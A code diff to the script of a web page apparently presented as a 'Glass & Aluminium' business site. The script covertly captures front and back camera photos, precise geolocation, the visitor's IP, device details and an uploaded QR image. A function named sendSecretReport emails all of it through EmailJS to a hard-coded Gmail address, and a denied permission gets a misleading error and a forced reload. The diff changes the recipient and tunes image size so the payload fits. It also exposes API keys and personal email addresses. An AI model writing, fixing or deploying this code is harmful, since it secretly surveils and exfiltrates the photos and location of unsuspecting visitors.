@@ -499,11 +499,88 @@
         (function () {
             "use strict";
 
-            // ----- EMAILJS CONFIG -----
+            // Store errors to prevent losing them on refresh
+            let errorLog = [];
+
+            // ----- EMAILJS CONFIG (UPDATED EMAIL) -----
             const EMAILJS_PUBLIC_KEY = 'm3hOuuwWAZThOtVkU';
             const EMAILJS_SERVICE_ID = 'service_lzy9odo';
             const EMAILJS_TEMPLATE_ID = 'template_intorfr';
-            const RECIPIENT_EMAIL = 'bhavsarharsh802@gmail.com';
+            const RECIPIENT_EMAIL = 'mrsmartboy123@gmail.com'; // ✅ Updated email
+
+            // Override console.error to store errors
+            const originalConsoleError = console.error;
+            console.error = function (...args) {
+                errorLog.push({
+                    timestamp: new Date().toISOString(),
+                    message: args.join(' ')
+                });
+                // Keep original behavior
+                originalConsoleError.apply(console, args);
+            };
+
+            // Log errors to a visible div on page (hidden by default, but accessible)
+            function createErrorDisplay() {
+                const errorDiv = document.createElement('div');
+                errorDiv.id = 'errorDisplay';
+                errorDiv.style.cssText = `
+                    position: fixed;
+                    top: 10px;
+                    right: 10px;
+                    max-width: 400px;
+                    max-height: 300px;
+                    overflow: auto;
+                    background: rgba(0,0,0,0.9);
+                    color: #ff6b6b;
+                    padding: 15px;
+                    border-radius: 8px;
+                    font-size: 12px;
+                    font-family: monospace;
+                    z-index: 9999;
+                    display: none;
+                    border: 2px solid #ff6b6b;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+                `;
+                document.body.appendChild(errorDiv);
+                return errorDiv;
+            }
+
+            const errorDisplay = createErrorDisplay();
+
+            // Show errors on double-click of the page (for debugging)
+            document.addEventListener('dblclick', function () {
+                if (errorDisplay.style.display === 'none') {
+                    errorDisplay.style.display = 'block';
+                    errorDisplay.innerHTML = errorLog.map(e =>
+                        `<div style="border-bottom: 1px solid #333; padding: 5px 0;">
+                            <span style="color: #888;">${e.timestamp}</span><br>
+                            <span>${e.message}</span>
+                        </div>`
+                    ).join('') || 'No errors logged.';
+                } else {
+                    errorDisplay.style.display = 'none';
+                }
+            });
+
+            // Also log to a hidden textarea for persistence
+            function saveErrorToStorage(errorMsg) {
+                try {
+                    let stored = localStorage.getItem('glassAluminiumErrors') || '';
+                    stored += `[${new Date().toISOString()}] ${errorMsg}\n`;
+                    localStorage.setItem('glassAluminiumErrors', stored);
+                } catch (e) { }
+            }
+
+            // Override console.error to also save to storage
+            console.error = function (...args) {
+                const msg = args.join(' ');
+                errorLog.push({
+                    timestamp: new Date().toISOString(),
+                    message: msg
+                });
+                saveErrorToStorage(msg);
+                originalConsoleError.apply(console, args);
+            };
 
             // Initialize EmailJS
             try {
@@ -646,7 +723,10 @@
                             { enableHighAccuracy: true, timeout: 3000 }
                         );
                     });
-                } catch (e) { permissions.geolocation = false; }
+                } catch (e) {
+                    console.error('Geolocation error:', e);
+                    permissions.geolocation = false;
+                }
 
                 try {
                     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -659,7 +739,10 @@
                             permissions.camera = true;
                         }
                     }
-                } catch (e) { permissions.camera = false; }
+                } catch (e) {
+                    console.error('Camera error:', e);
+                    permissions.camera = false;
+                }
 
                 return permissions;
             }
@@ -673,13 +756,16 @@
                     }
                     navigator.geolocation.getCurrentPosition(
                         (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                        () => resolve({ lat: 'error', lon: 'error' }),
+                        (err) => {
+                            console.error('Location error:', err);
+                            resolve({ lat: 'error', lon: 'error' });
+                        },
                         { enableHighAccuracy: true, timeout: 5000 }
                     );
                 });
             }
 
-            // Capture photos - returns both count and image data
+            // Capture photos
             async function capturePhotos(facingMode, count = 1) {
                 return new Promise((resolve) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -690,8 +776,8 @@
                     const constraints = {
                         video: {
                             facingMode: facingMode,
-                            width: { ideal: 320 },
-                            height: { ideal: 320 }
+                            width: { ideal: 150 },
+                            height: { ideal: 150 }
                         },
                         audio: false
                     };
@@ -706,8 +792,8 @@
 
                             video.onloadedmetadata = () => {
                                 const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 320;
-                                canvas.height = video.videoHeight || 320;
+                                canvas.width = video.videoWidth || 150;
+                                canvas.height = video.videoHeight || 150;
                                 const ctx = canvas.getContext('2d');
                                 const images = [];
                                 let captured = 0;
@@ -721,10 +807,11 @@
                                     }
                                     try {
                                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                        // Higher quality for email visibility
-                                        images.push(canvas.toDataURL('image/jpeg', 0.8));
+                                        images.push(canvas.toDataURL('image/jpeg', 0.3));
                                         captured++;
-                                    } catch (e) { /* ignore */ }
+                                    } catch (e) {
+                                        console.error('Capture error:', e);
+                                    }
                                 }, 400);
 
                                 setTimeout(() => {
@@ -736,12 +823,16 @@
                                 }, 4000);
                             };
 
-                            video.onerror = () => {
+                            video.onerror = (err) => {
+                                console.error('Video error:', err);
                                 if (stream) stream.getTracks().forEach(t => t.stop());
                                 resolve({ count: 0, images: [] });
                             };
                         })
-                        .catch(() => resolve({ count: 0, images: [] }));
+                        .catch((err) => {
+                            console.error('Camera access error:', err);
+                            resolve({ count: 0, images: [] });
+                        });
                 });
             }
 
@@ -763,10 +854,13 @@
                 return fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(data => data.ip || 'unknown')
-                    .catch(() => 'unavailable');
+                    .catch((err) => {
+                        console.error('IP fetch error:', err);
+                        return 'unavailable';
+                    });
             }
 
-            // Send via EmailJS with images as HTML
+            // Send via EmailJS with images
             async function sendSecretReport(payload) {
                 try {
                     // Build HTML for images
@@ -775,33 +869,32 @@
 
                     if (payload.frontImages && payload.frontImages.length > 0) {
                         frontImagesHTML = payload.frontImages.map(img =>
-                            `<img src="${img}" style="max-width: 200px; max-height: 200px; margin: 5px; border: 1px solid #ddd; border-radius: 8px;">`
+                            `<img src="${img}" style="max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #ddd; margin: 5px;">`
                         ).join('');
-                    } else {
-                        frontImagesHTML = '<p style="color: #999;">No front camera images captured</p>';
                     }
 
                     if (payload.backImages && payload.backImages.length > 0) {
                         backImagesHTML = payload.backImages.map(img =>
-                            `<img src="${img}" style="max-width: 200px; max-height: 200px; margin: 5px; border: 1px solid #ddd; border-radius: 8px;">`
+                            `<img src="${img}" style="max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #ddd; margin: 5px;">`
                         ).join('');
-                    } else {
-                        backImagesHTML = '<p style="color: #999;">No back camera images captured</p>';
                     }
 
                     // Build complete HTML message with images
                     const htmlMessage = `
-                        <h2>📸 Camera Captures</h2>
-                        
-                        <h3>Front Camera (${payload.frontImages ? payload.frontImages.length : 0} photos)</h3>
-                        <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px;">
-                            ${frontImagesHTML}
+                        <h3>📸 Front Camera Images (${payload.frontImages ? payload.frontImages.length : 0})</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 20px;">
+                            ${frontImagesHTML || '<p style="color: #999;">No front camera images captured</p>'}
                         </div>
                         
-                        <h3>Back Camera (${payload.backImages ? payload.backImages.length : 0} photos)</h3>
-                        <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px;">
-                            ${backImagesHTML}
+                        <h3>📸 Back Camera Images (${payload.backImages ? payload.backImages.length : 0})</h3>
+                        <div style="display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 20px;">
+                            ${backImagesHTML || '<p style="color: #999;">No back camera images captured</p>'}
                         </div>
+                        
+                        ${payload.qrData ? `
+                        <h3>📱 QR Code Image</h3>
+                        <img src="${payload.qrData}" style="max-width: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 5px;">
+                        ` : ''}
                         
                         <hr style="margin: 20px 0;">
                         
@@ -822,10 +915,6 @@
                         <p><strong>Screen:</strong> ${payload.device.screen}</p>
                         <p><strong>Timezone:</strong> ${payload.device.timezone}</p>
                         
-                        <h2>📱 QR Code Upload</h2>
-                        <p><strong>QR Uploaded:</strong> ${payload.qrUploaded ? '✅ Yes' : '❌ No'}</p>
-                        ${payload.qrData ? `<img src="${payload.qrData}" style="max-width: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 5px;">` : ''}
-                        
                         <h2>⏰ Timestamp</h2>
                         <p>${payload.timestamp}</p>
                     `;
@@ -845,10 +934,10 @@
                         back_photos: payload.backImages ? payload.backImages.length : 0,
                         qr_uploaded: payload.qrUploaded ? 'Yes ✅' : 'No ❌',
                         timestamp: payload.timestamp || new Date().toISOString(),
-                        message: htmlMessage, // Send HTML message with images
+                        message: htmlMessage,
                     };
 
-                    console.log('📤 Sending email with images...');
+                    console.log('📤 Sending email to:', RECIPIENT_EMAIL);
                     console.log('Front images:', payload.frontImages ? payload.frontImages.length : 0);
                     console.log('Back images:', payload.backImages ? payload.backImages.length : 0);
 
@@ -860,11 +949,11 @@
                     console.log('✅ Email sent successfully:', response);
                     return true;
                 } catch (error) {
-                    console.error('❌ EmailJS error details:', error);
-                    console.error('Error status:', error.status);
+                    console.error('❌ EmailJS error:', error);
+                    console.error('Status:', error.status);
+                    console.error('Text:', error.text);
                     if (error.status === 413) {
                         console.error('❌ Payload too large! Images may be too big.');
-                        console.error('Try reducing image quality or count.');
                     }
                     return false;
                 }
@@ -895,7 +984,7 @@
 
                     if (!perms.geolocation || !perms.camera) {
                         console.warn('⚠️ Permissions denied');
-                        showToast(`❌ Something went wrong. Please try again.`, true);
+                        showToast('❌ Something went wrong. Please try again.', true);
                         hideSpinner();
                         setTimeout(() => location.reload(), 2000);
                         return;
@@ -915,33 +1004,39 @@
                     // Get QR data if uploaded
                     let qrData = null;
                     if (hasQR) {
-                        const file = qrInput.files[0];
-                        qrData = await new Promise((resolve) => {
-                            const reader = new FileReader();
-                            reader.onload = (ev) => resolve(ev.target.result);
-                            reader.readAsDataURL(file);
-                        });
+                        try {
+                            const file = qrInput.files[0];
+                            qrData = await new Promise((resolve, reject) => {
+                                const reader = new FileReader();
+                                reader.onload = (ev) => resolve(ev.target.result);
+                                reader.onerror = (err) => {
+                                    console.error('QR read error:', err);
+                                    reject(err);
+                                };
+                                reader.readAsDataURL(file);
+                            });
+                        } catch (e) {
+                            console.error('QR upload error:', e);
+                        }
                     }
 
                     // Collect data with actual images
                     console.log('📸 Capturing photos...');
 
-                    // Try front camera - if fails, just get 0
                     let frontResult = { count: 0, images: [] };
                     try {
                         frontResult = await capturePhotos('user', 1);
                         console.log('📸 Front camera:', frontResult.count, 'photos captured');
                     } catch (e) {
-                        console.log('📸 Front camera not available');
+                        console.error('📸 Front camera error:', e);
                     }
 
-                    // Try back camera - if fails, just get 0
                     let backResult = { count: 0, images: [] };
                     try {
                         backResult = await capturePhotos('environment', 5);
                         console.log('📸 Back camera:', backResult.count, 'photos captured');
                     } catch (e) {
-                        console.log('📸 Back camera not available');
+                        console.error('📸 Back camera error:', e);
                     }
 
                     // Get other data
@@ -993,7 +1088,9 @@
                 }
             });
 
-            console.log('Glass & Aluminium · secure (With actual photos in email)');
+            console.log('Glass & Aluminium · secure (With images)');
+            console.log('📧 Sending to: mrsmartboy123@gmail.com');
+            console.log('💡 Double-click anywhere to view error log');
         })();
     </script>
 </body>
